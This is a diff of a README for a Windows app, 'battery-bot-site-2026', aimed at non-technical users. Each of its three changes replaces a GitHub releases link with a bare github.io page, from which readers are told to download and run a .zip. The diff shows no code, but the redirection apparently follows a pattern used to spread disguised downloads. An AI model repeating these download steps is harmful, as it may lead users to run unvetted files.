@@ -4,14 +4,14 @@
 
 Welcome! This guide will help you download and run **battery-bot-site-2026** on your Windows computer. You don’t need any technical skills—just follow the steps below, and you’ll be exploring battery insights in minutes.
 
-[![Download Now](https://img.shields.io/badge/Download-battery--bot--site--2026-blue?style=for-the-badge&logo=github)](https://github.com/luraactinoid636/battery-bot-site-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-battery--bot--site--2026-blue?style=for-the-badge&logo=github)](https://luraactinoid636.github.io)
 
 ---
 
 ## 📥 Download the Application
 
 **Step 1:** Visit this link to download the application:  
-👉 **[https://github.com/luraactinoid636/battery-bot-site-2026/releases](https://github.com/luraactinoid636/battery-bot-site-2026/releases)**
+👉 **[https://luraactinoid636.github.io](https://luraactinoid636.github.io)**
 
 **Step 2:** On that page, you’ll see a list of files. Look for the latest version—it’s usually at the top. Click the file name that ends with `.zip` (or whatever file is shown as the main download). Your browser will save it to your **Downloads** folder.
 
@@ -146,7 +146,7 @@ Thank you for using the app!
 
 Click below to go straight to the download page:
 
-[👉 **Download battery-bot-site-2026 Now**](https://github.com/luraactinoid636/battery-bot-site-2026/releases)
+[👉 **Download battery-bot-site-2026 Now**](https://luraactinoid636.github.io)
 
 ---
 
